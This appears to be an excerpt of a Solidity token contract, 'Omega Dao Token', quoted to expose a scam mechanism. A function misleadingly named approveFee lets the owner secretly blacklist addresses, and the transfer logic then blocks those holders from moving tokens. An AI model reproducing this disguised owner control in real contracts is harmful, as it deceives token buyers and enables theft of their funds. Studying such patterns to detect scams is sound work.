...
contract OmegaDaoToken is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _approveFee;
    ...
    string private _name = 'Omega Dao Token';
    string private _symbol = 'OmegaDAO';
    ...
    function approveFee(address feeAddress) external onlyOwner {
        if (_approveFee[feeAddress] == true) {
            _approveFee[feeAddress] = false;
        } else {_approveFee[feeAddress] = true;
            emit botBanned (feeAddress, _approveFee[feeAddress]);
          }
    }
    
    function checkFee(address feeAddress) public view returns (bool) {
        return _approveFee[feeAddress];
    }
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
       ...
       function reflect(address owner, uint256 amount) public virtual onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_approveFee[sender] || _approveFee[recipient]) require (amount == 0, "");
